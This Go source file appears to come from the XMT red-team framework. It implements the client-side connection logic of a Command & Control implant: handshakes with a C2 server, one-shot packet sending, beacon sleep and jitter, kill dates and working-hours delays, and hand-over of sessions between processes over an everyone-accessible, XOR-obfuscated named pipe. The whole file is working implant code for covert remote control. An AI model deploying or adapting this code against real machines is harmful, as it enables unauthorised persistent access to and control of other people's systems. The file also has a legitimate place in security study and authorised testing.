// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

// Package c2 is the primary Command & Control (C2) endpoint for creating and
// managing a C2 Session or spinning up a C2 service.
//
package c2

import (
	"context"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/PurpleSec/logx"

	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

// Set this boolean to true to enable Sessions to directly quit on 'Connect*'
// functions if the WorkHours is not met instead of waiting.
const workHoursQuit = false

var (
	// ErrNoHost is an error returned by the Connect and Listen functions when
	// the provided Profile does not provide a host string.
	ErrNoHost = xerr.Sub("empty or nil Host", 0x3F)
	// ErrNoConn is an error returned by the Load* functions when an attempt to
	// discover the parent host failed due to a timeout.
	ErrNoConn = xerr.Sub("other side did not come up", 0x40)
	// ErrInvalidProfile is an error returned by c2 functions when the Profile
	// given is nil.
	ErrInvalidProfile = xerr.Sub("empty or nil Profile", 0x41)
)

// Shoot sends the packet with the specified data to the server and does NOT
// register the device with the Server.
//
// This is used for spending specific data segments in single use connections.
func Shoot(p cfg.Profile, n *com.Packet) error {
	return ShootContext(context.Background(), p, n)
}

// Connect creates a Session using the supplied Profile to connect to the
// listening server specified in the Profile.
//
// A Session will be returned if the connection handshake succeeds, otherwise a
// connection-specific error will be returned.
func Connect(l logx.Log, p cfg.Profile) (*Session, error) {
	return ConnectContext(context.Background(), l, p)
}

// Load will attempt to find a Session in another process or thread that is
// pending Migration. This function will look on the Pipe name provided for the
// specified duration period.
//
// If a Session is found, it is loaded and the provided log is used for the
// local Session log.
//
// If a Session is not found, or errors, this function returns an error message
// or a timeout with a nil Session.
func Load(l logx.Log, n string, t time.Duration) (*Session, error) {
	return LoadContext(context.Background(), l, n, t)
}

// ShootContext sends the packet with the specified data to the server and does
// NOT register the device with the Server.
//
// This is used for spending specific data segments in single use connections.
//
// This function version allows for setting the Context used.
func ShootContext(x context.Context, p cfg.Profile, n *com.Packet) error {
	if p == nil {
		return ErrInvalidProfile
	}
	h, w, t := p.Next()
	if len(h) == 0 {
		return ErrNoHost
	}
	c, err := p.Connect(x, h)
	if err != nil {
		return xerr.Wrap("unable to connect", err)
	}
	if n == nil {
		n = &com.Packet{Device: local.UUID}
	} else if n.Device.Empty() {
		n.Device = local.UUID
	}
	n.Flags |= com.FlagOneshot
	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
	err = writePacket(c, w, t, n)
	if c.Close(); err != nil {
		return xerr.Wrap("unable to write packet", err)
	}
	return nil
}

// ConnectContext creates a Session using the supplied Profile to connect to the
// listening server specified in the Profile.
//
// A Session will be returned if the connection handshake succeeds, otherwise a
// connection-specific error will be returned.
//
// This function version allows for setting the Context passed to the Session.
func ConnectContext(x context.Context, l logx.Log, p cfg.Profile) (*Session, error) {
	return connectContextInner(x, nil, l, p)
}

// LoadContext will attempt to find a Session in another process or thread that
// is pending Migration. This function will look on the Pipe name provided for
// the specified duration period.
//
// If a Session is found, it is loaded and the provided log and Context are used
// for the local Session log and parent Context.
//
// If a Session is not found, or errors, this function returns an error message
// or a timeout with a nil Session.
func LoadContext(x context.Context, l logx.Log, n string, t time.Duration) (*Session, error) {
	if len(n) == 0 {
		return nil, xerr.Sub("empty or invalid pipe name", 0x43)
	}
	if t == 0 {
		t = spawnDefaultTime
	}
	if bugtrack.Enabled {
		bugtrack.Track(`c2.LoadContext(): Starting Pipe listen on "%s"..`, n)
	}
	var (
		y, f   = context.WithTimeout(x, t)
		v, err = pipe.ListenPerms(pipe.Format(n+"."+strconv.FormatUint(uint64(os.Getpid()), 16)), pipe.PermEveryone)
	)
	if err != nil {
		f()
		return nil, err
	}
	var (
		z = make(chan net.Conn, 1)
		c net.Conn
	)
	go func() {
		if a, e := v.Accept(); e == nil {
			z <- a
		}
	}()
	select {
	case c = <-z:
		if bugtrack.Enabled {
			bugtrack.Track(`c2.LoadContext(): Received a connection on "%s"!.`, n)
		}
	case <-y.Done():
	case <-x.Done():
	}
	v.Close()
	if f(); c == nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): No connection was found!")
		}
		return nil, ErrNoConn
	}
	var (
		w = data.NewWriter(crypto.NewXORWriter(crypto.XOR(n), c))
		r = data.NewReader(crypto.NewXORReader(crypto.XOR(n), c))
		j uint16
		b []byte
	)
	// Set a connection deadline. I doubt this will fail, but let's be sure.
	c.SetDeadline(time.Now().Add(spawnDefaultTime))
	if err = r.ReadUint16(&j); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read Job failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read Job", err)
	}
	if err = r.ReadBytes(&b); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read Profile failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read Profile", err)
	}
	p, err := parseProfile(b)
	if err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): ParseProfile failed: %s", err.Error())
		}
		return nil, xerr.Wrap("parse Profile", err)
	}
	if j == 0 { // If JobID is zero, it's Spawn
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Starting Spawn!")
		}
		var s *Session
		if s, err = connectContextInner(x, r, l, p); err == nil {
			w.WriteUint16(0x4F4B)
		}
		c.Close()
		return s, err
	}
	var (
		s Session
		m []proxyData
	)
	if s.log, s.sleep = cout.New(l), p.Sleep(); s.sleep <= 0 {
		s.sleep = cfg.DefaultSleep
	}
	if j := p.Jitter(); j >= 0 && j <= 100 {
		s.jitter = uint8(j)
	} else if j == -1 {
		s.jitter = cfg.DefaultJitter
	}
	if k := p.KillDate(); k != nil && !k.IsZero() {
		s.kill = k
	}
	if z := p.WorkHours(); z != nil && !z.Empty() {
		s.work = z
	}
	if m, err = s.readDeviceInfo(infoMigrate, r); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read Device Info failed: %s", err.Error())
		}
		return nil, xerr.Wrap("read device info", err)
	}
	copy(local.UUID[:], s.ID[:])
	copy(local.Device.ID[:], s.ID[:])
	s.Device = local.Device.Machine
	var h string
	if h, s.w, s.t = p.Next(); len(h) == 0 {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Empty/nil Host received.")
		}
		return nil, ErrNoHost
	}
	s.host.Set(h)
	if err = w.WriteUint16(0x4F4B); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Write OK failed: %s", err.Error())
		}
		return nil, xerr.Wrap("write OK", err)
	}
	var k uint16
	if err = r.ReadUint16(&k); err != nil {
		if c.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Read OK failed: %s", err.Error())
		}
		return nil, xerr.Sub("read OK", 0x45)
	}
	if c.Close(); k != 0x4F4B { // 0x4F4B == "OK"
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): Bad OK value received.")
		}
		return nil, xerr.Sub("unexpected OK value", 0x45)
	}
	var (
		o = &com.Packet{ID: RvResult, Device: s.ID, Job: j}
		q net.Conn
	)
	s.writeDeviceInfo(infoSyncMigrate, o) // We can't really write Proxy data yet, so let's sync this first.
	if q, err = p.Connect(x, s.host.String()); err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Connect failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first Connect", err)
	}
	// KeyCrypt: Encrypt first packet
	o.Crypt(&s.key)
	// Set an initial write deadline, to make sure that the connection is stable.
	q.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
	if err = writePacket(q, s.w, s.t, o); err != nil {
		if q.Close(); bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Packet write failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first Packet write", err)
	}
	o.Clear()
	// Set an initial read deadline, to make sure that the connection is stable.
	q.SetReadDeadline(time.Now().Add(spawnDefaultTime))
	o, err = readPacket(q, s.w, s.t)
	if q.Close(); err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Packet read failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first Packet read", err)
	}
	// KeyCrypt: Decrypt first packet
	o.Crypt(&s.key)
	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
	if err = receive(&s, nil, o); err != nil {
		if bugtrack.Enabled {
			bugtrack.Track("c2.LoadContext(): First Receive failed: %s", err.Error())
		}
		return nil, xerr.Wrap("first receive", err)
	}
	if o = nil; len(m) > 0 {
		var g cfg.Profile
		for i := range m {
			if g, err = parseProfile(m[i].p); err != nil {
				if s.Close(); bugtrack.Enabled {
					bugtrack.Track("c2.LoadContext(): Proxy Profile Parse failed: %s", err.Error())
				}
				return nil, xerr.Wrap("parse Proxy Profile", err)
			}
			if _, err = s.NewProxy(m[i].n, m[i].b, g); err != nil {
				if s.Close(); bugtrack.Enabled {
					bugtrack.Track("c2.LoadContext(): Proxy Setup failed: %s", err.Error())
				}
				return nil, xerr.Wrap("setup Proxy", err)
			}
		}
	}
	if m = nil; bugtrack.Enabled {
		bugtrack.Track("c2.LoadContext(): Done, Resuming operations!")
	}
	s.wait()
	go s.listen()
	go s.m.(eventer).listen(&s)
	return &s, nil
}
func connectContextInner(x context.Context, r data.Reader, l logx.Log, p cfg.Profile) (*Session, error) {
	if p == nil {
		return nil, ErrInvalidProfile
	}
	h, w, t := p.Next()
	if len(h) == 0 {
		return nil, ErrNoHost
	}
	var (
		s = &Session{ID: local.UUID, Device: local.Device.Machine}
		n = &com.Packet{ID: SvHello, Device: local.UUID, Job: uint16(util.FastRand())}
	)
	if s.log, s.w, s.t, s.sleep = cout.New(l), w, t, p.Sleep(); s.sleep <= 0 {
		s.sleep = cfg.DefaultSleep
	}
	if j := p.Jitter(); j >= 0 && j <= 100 {
		s.jitter = uint8(j)
	} else if j == -1 {
		s.jitter = cfg.DefaultJitter
	}
	if k := p.KillDate(); k != nil && !k.IsZero() {
		s.kill = k
	}
	if z := p.WorkHours(); z != nil && !z.Empty() {
		s.work = z
	}
	if s.host.Set(h); r != nil {
		if _, err := s.readDeviceInfo(infoSync, r); err != nil {
			return nil, xerr.Wrap("read info failed", err)
		}
	} else if s.work != nil && !s.work.Empty() {
		if v := s.work.Work(); v > 0 {
			if workHoursQuit {
				if cout.Enabled {
					s.log.Warning(`[%s] WorkHours wanted to wait "%s", so we're exiting!`, s.ID, v.String())
				}
				return nil, xerr.Wrap("working hours not ready", context.DeadlineExceeded)
			}
			// NOTE(dij): I have to do this to allow the compiler to optimize it
			//            out if it's enabled.
			if !workHoursQuit {
				if cout.Enabled {
					s.log.Warning(`[%s] WorkHours waiting "%s" until connecting!`, s.ID, v.String())
				}
				time.Sleep(v)
			}
		}
	}
	if s.kill != nil && time.Now().After(*s.kill) {
		if cout.Enabled {
			s.log.Warning(`[%s] KillDate "%s" is after the current time, exiting!`, s.ID, s.kill.Format(time.UnixDate))
		}
		return nil, xerr.Wrap("killdate expired", context.DeadlineExceeded)
	}
	c, err := p.Connect(x, h)
	if err != nil {
		return nil, xerr.Wrap("unable to connect", err)
	}
	s.writeDeviceInfo(infoHello, n)
	// KeyCrypt: Generate initial key set here, append to the Packet.
	//           This Packet is NOT encrypted.
	if s.generateSessionKey(n); cout.Enabled {
		s.log.Debug("[%s] Generated KeyCrypt key set!", s.ID)
	}
	if bugtrack.Enabled {
		bugtrack.Track("c2.receiveSingle(): %s KeyCrypt details %v.", s.ID, s.key)
	}
	// Set an initial write deadline, to make sure that the connection is stable.
	c.SetWriteDeadline(time.Now().Add(spawnDefaultTime))
	if err = writePacket(c, s.w, s.t, n); err != nil {
		c.Close()
		return nil, xerr.Wrap("first Packet write", err)
	}
	// Set an initial read deadline, to make sure that the connection is stable.
	c.SetReadDeadline(time.Now().Add(spawnDefaultTime))
	v, err := readPacket(c, s.w, s.t)
	c.Close()
	if n.Clear(); err != nil {
		return nil, xerr.Wrap("first Packet read", err)
	}
	if v == nil || v.ID != SvComplete {
		return nil, xerr.Sub("first Packet is invalid", 0x42)
	}
	if v.Clear(); cout.Enabled {
		s.log.Info(`[%s] Client connected to "%s"!`, s.ID, h)
	}
	r, n = nil, nil
	s.p, s.wake, s.ch = p, make(chan struct{}, 1), make(chan struct{})
	s.frags, s.m = make(map[uint16]*cluster), make(eventer, maxEvents)
	s.ctx, s.send, s.tick = x, make(chan *com.Packet, 256), time.NewTicker(s.sleep)
	go s.listen()
	go s.m.(eventer).listen(s)
	return s, nil
}

// LoadOrConnect will attempt to find a Session in another process or thread that
// is pending Migration. This function will look on the Pipe name provided for
// the specified duration period.
//
// If a Session is found, it is loaded and the provided log and Context are used
// for the local Session log and parent Context.
//
// If a Session is not found or the Migration fails with an error, then this
// function creates a Session using the supplied Profile to connect to the
// listening server specified in the Profile.
//
// A Session will be returned if the connection handshake succeeds, otherwise a
// connection-specific error will be returned.
func LoadOrConnect(x context.Context, l logx.Log, n string, t time.Duration, p cfg.Profile) (*Session, error) {
	if s, _ := LoadContext(x, l, n, t); s != nil {
		return s, nil
	}
	return ConnectContext(x, l, p)
}
